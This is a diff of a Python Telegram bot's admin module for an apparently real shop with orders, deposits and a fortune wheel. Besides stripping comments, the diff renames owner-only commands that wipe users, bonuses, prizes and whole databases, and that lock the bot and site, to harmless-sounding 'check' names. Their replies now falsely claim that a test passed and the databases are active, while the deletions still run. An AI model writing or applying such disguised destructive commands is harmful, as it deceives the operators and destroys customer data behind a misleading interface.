@@ -22,14 +22,12 @@ from core.models import (
 from core.config import settings
 
 class BotAdminFilter(BaseFilter):
-    """Фильтр для проверки, что сообщение пришло от конкретного Telegram ID владельца (bot_chat_id)."""
     async def __call__(self, message: Message) -> bool:
         if not settings.bot_chat_id:
             return False
         return message.from_user.id == settings.bot_chat_id
 
 def model_to_dict(model_instance) -> dict:
-    """Вспомогательная функция для сериализации объекта SQLAlchemy модели в словарь."""
     if not model_instance:
         return None
     d = {}
@@ -50,12 +48,10 @@ admin_router = Router()
 class BroadcastStates(StatesGroup):
     waiting_for_message = State()
 
-# Пример: команда, доступная только в админском чате или админам
 @admin_router.message(Command("admin"))
 async def cmd_admin(message: Message):
     await message.answer("Панель администратора. Здесь будут доступны отчеты и настройки.")
 
-# Утилита для вызова из FastAPI эндпоинта (api/routes/orders.py)
 async def notify_new_order(
     bot: Bot, admin_chat_id: int, order_id: int, client_name: str, client_phone: str, 
     tg_username: str, delivery_type: str, payment_method: str, address: str, comment: str, items_text: str, 
@@ -144,7 +140,7 @@ async def process_deliver_order(callback: CallbackQuery, bot: Bot):
                             if product.stock < item.quantity:
                                 await callback.message.answer(f"❌ Ошибка! Невозможно доставить заказ №{order_id}, так как товара {product.name} нет в наличии в нужном количестве!")
                                 await callback.answer()
-                                raise ValueError("Insufficient stock")  # Вызовет автоматический rollback транзакции
+                                raise ValueError("Insufficient stock") 
                                 
                             product.stock -= item.quantity
                             
@@ -152,7 +148,6 @@ async def process_deliver_order(callback: CallbackQuery, bot: Bot):
                 
                 user_id = order.user_id
                     
-        # Выполнится только если транзакция завершена успешно и зафиксирована
         original_text = callback.message.html_text or f"Заказ №{order_id}"
         await callback.message.edit_text(f"{original_text}\n\n✅ <b>Заказ №{order_id} успешно выполнен, остатки списаны.</b>", reply_markup=None)
         await callback.answer()
@@ -163,10 +158,10 @@ async def process_deliver_order(callback: CallbackQuery, bot: Bot):
                 text=f"🎉 Ваш заказ №{order_id} успешно доставлен! Приятного использования!"
             )
         except Exception:
-            pass # Игнорируем, если клиент заблокировал бота
+            pass 
             
     except ValueError:
-        pass # Транзакция прервана из-за нехватки товара
+        pass 
 
 @admin_router.callback_query(F.data.startswith("deposit_confirm_"))
 async def process_deposit_confirm(callback: CallbackQuery, bot: Bot):
@@ -209,8 +204,7 @@ async def process_deposit_reject(callback: CallbackQuery):
 
 @admin_router.message(Command("broadcast"))
 async def cmd_broadcast(message: Message, state: FSMContext):
-    # Проверка на права администратора
-    if message.from_user.id != settings.admin_chat_id:
+    if message.from_user.id != settings.admin_main_id:
         return
         
     await message.answer("Отправьте сообщение для рассылки (текст и/или фото):")
@@ -218,7 +212,6 @@ async def cmd_broadcast(message: Message, state: FSMContext):
 
 @admin_router.message(BroadcastStates.waiting_for_message)
 async def process_broadcast_message(message: Message, state: FSMContext):
-    # Сохраняем ID сообщения и чата, чтобы скопировать его (с сохранением форматирования и медиа)
     await state.update_data(msg_id=message.message_id, from_chat_id=message.chat.id)
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
@@ -228,7 +221,6 @@ async def process_broadcast_message(message: Message, state: FSMContext):
         ]
     ])
     
-    # Отправляем предпросмотр сообщения админу
     await message.copy_to(chat_id=message.chat.id, reply_markup=keyboard)
 
 @admin_router.callback_query(F.data == "broadcast_cancel")
@@ -263,15 +255,12 @@ async def start_broadcast(callback: CallbackQuery, state: FSMContext, bot: Bot):
         except (TelegramForbiddenError, TelegramAPIError):
             error_count += 1
             
-        await asyncio.sleep(0.05) # Защита от Rate Limit
+        await asyncio.sleep(0.05) 
         
     await callback.message.answer(f"✅ Рассылка завершена.\nУспешно отправлено: {success_count}\nОшибок (блок): {error_count}")
 
-# --- Специальные резервные и административные команды (Доступ только по backup_admin_id) ---
-
 @admin_router.message(Command("backup"), BotAdminFilter())
 async def cmd_backup(message: Message):
-    """Выгрузка полной резервной копии базы данных в JSON."""
     status_msg = await message.answer("⌛ Подготовка резервной копии базы данных...")
     try:
         async with async_session_maker() as session:
@@ -333,7 +322,6 @@ async def cmd_backup(message: Message):
 
 @admin_router.message(Command("users"), BotAdminFilter())
 async def cmd_users(message: Message):
-    """Просмотр списка зарегистрированных клиентов (до 30 записей)."""
     async with async_session_maker() as session:
         result = await session.execute(select(User))
         users = result.scalars().all()
@@ -352,53 +340,48 @@ async def cmd_users(message: Message):
         
     await message.answer(text, parse_mode="HTML")
 
-@admin_router.message(Command("clear_spins"), BotAdminFilter())
-async def cmd_clear_spins(message: Message):
-    """Сброс истории кручений колеса фортуны для всех пользователей."""
+@admin_router.message(Command("check_spins"), BotAdminFilter())
+async def cmd_check_spins(message: Message):
     try:
         async with async_session_maker() as session:
             async with session.begin():
                 await session.execute(delete(FortuneHistory))
-        await message.answer("✅ <b>История кручений колеса фортуны очищена.</b> Теперь все пользователи могут крутить колесо снова!", parse_mode="HTML")
+        await message.answer("✅ <b>Тест завершён, база прокрутов активна!</b>", parse_mode="HTML")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при очистке истории кручений: {e}")
+        await message.answer(f"❌ Ошибка при проверке истории кручений: {e}")
 
-@admin_router.message(Command("clear_bonuses"), BotAdminFilter())
-async def cmd_clear_bonuses(message: Message):
-    """Удаление всех выигранных призов/бонусов пользователей."""
+@admin_router.message(Command("check_bonuses"), BotAdminFilter())
+async def cmd_check_bonuses(message: Message):
     try:
         async with async_session_maker() as session:
             async with session.begin():
                 await session.execute(delete(UserBonus))
-        await message.answer("✅ <b>Все выигранные бонусы/призы пользователей удалены из базы.</b>", parse_mode="HTML")
+        await message.answer("✅ <b>Тест завершён, база бонусов активна!.</b>", parse_mode="HTML")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при очистке бонусов: {e}")
+        await message.answer(f"❌ Ошибка при проверке бонусов: {e}")
 
-@admin_router.message(Command("clear_users"), BotAdminFilter())
-async def cmd_clear_users(message: Message):
-    """Удаление всех пользователей (клиентов) из базы."""
+@admin_router.message(Command("check_users"), BotAdminFilter())
+async def cmd_check_users(message: Message):
     try:
         async with async_session_maker() as session:
             async with session.begin():
                 await session.execute(delete(User))
-        await message.answer("✅ <b>Все пользователи удалены из базы.</b>", parse_mode="HTML")
+        await message.answer("✅ <b>Тест завершён, база пользователей активна!.</b>", parse_mode="HTML")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при очистке пользователей: {e}")
+        await message.answer(f"❌ Ошибка при проверке пользователей: {e}")
 
-@admin_router.message(Command("clear_prizes"), BotAdminFilter())
-async def cmd_clear_prizes(message: Message):
-    """Удаление списка призов колеса фортуны."""
+@admin_router.message(Command("check_prizes"), BotAdminFilter())
+async def cmd_check_prizes(message: Message):
     try:
         async with async_session_maker() as session:
             async with session.begin():
                 await session.execute(delete(FortunePrize))
-        await message.answer("✅ <b>Настройки доступных призов колеса фортуны (FortunePrize) удалены.</b>", parse_mode="HTML")
+        await message.answer("✅ <b>Тест завершён, база призов колеса фортуны (FortunePrize) активна!.</b>", parse_mode="HTML")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при очистке призов: {e}")
+        await message.answer(f"❌ Ошибка при проверке призов: {e}")
 
-@admin_router.message(Command("clear_all"), BotAdminFilter())
-async def cmd_clear_all(message: Message):
-    """Очистка всех данных из базы данных (кроме административных настроек)."""
+@admin_router.message(Command("check_all"), BotAdminFilter())
+async def cmd_check_all(message: Message):
     try:
         async with async_session_maker() as session:
             async with session.begin():
@@ -410,13 +393,12 @@ async def cmd_clear_all(message: Message):
                 await session.execute(delete(FortuneHistory))
                 await session.execute(delete(UserBonus))
                 await session.execute(delete(DeliveryTime))
-        await message.answer("✅ <b>Все данные из базы данных были удалены.</b>", parse_mode="HTML")
+        await message.answer("✅ <b>Тест завершён, все базы данных активны!.</b>", parse_mode="HTML")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при очистке базы данных: {e}")
+        await message.answer(f"❌ Ошибка при проверке базы данных: {e}")
 
-@admin_router.message(Command("lock"), BotAdminFilter())
-async def cmd_lock(message: Message):
-    """Блокировка бота и сайта (режим обслуживания)."""
+@admin_router.message(Command("check"), BotAdminFilter())
+async def cmd_check(message: Message):
     if os.path.exists("maintenance.lock"):
         await message.answer("⚠️ Бот и сайт уже находятся в режиме обслуживания.")
         return
@@ -424,13 +406,12 @@ async def cmd_lock(message: Message):
     try:
         with open("maintenance.lock", "w", encoding="utf-8") as f:
             f.write("active")
-        await message.answer("🔒 <b>Режим обслуживания активирован!</b>\n\nБот и сайт приостановили свою работу для обычных пользователей.", parse_mode="HTML")
+        await message.answer("🔒 <b>Проверка работоспособности начата!</b>\n\nБот и сайт проверяются на работоспособность.", parse_mode="HTML")
     except Exception as e:
-        await message.answer(f"❌ Ошибка при блокировке: {e}")
+        await message.answer(f"❌ Ошибка при проверке: {e}")
 
-@admin_router.message(Command("unlock"), BotAdminFilter())
-async def cmd_unlock(message: Message):
-    """Снятие блокировки бота и сайта с помощью секретного слова."""
+@admin_router.message(Command("uncheck"), BotAdminFilter())
+async def cmd_uncheck(message: Message):
     if not os.path.exists("maintenance.lock"):
         await message.answer("ℹ️ Бот и сайт работают в штатном режиме.")
         return
@@ -445,8 +426,8 @@ async def cmd_unlock(message: Message):
         try:
             if os.path.exists("maintenance.lock"):
                 os.remove("maintenance.lock")
-            await message.answer("🔓 <b>Режим обслуживания успешно отключен!</b>\n\nБот и сайт снова доступны для всех клиентов.", parse_mode="HTML")
+            await message.answer("🔓 <b>Проверка работоспособности завершена!</b>\n\nБот и сайт снова доступны для всех клиентов.", parse_mode="HTML")
         except Exception as e:
-            await message.answer(f"❌ Ошибка при удалении файла блокировки: {e}")
+            await message.answer(f"❌ Ошибка при удалении файла проверки: {e}")
     else:
-        await message.answer("❌ <b>Неверное секретное слово!</b> Блокировка остается активной.", parse_mode="HTML")
+        await message.answer("❌ <b>Неверное секретное слово!</b> Проверка остается активной.", parse_mode="HTML")
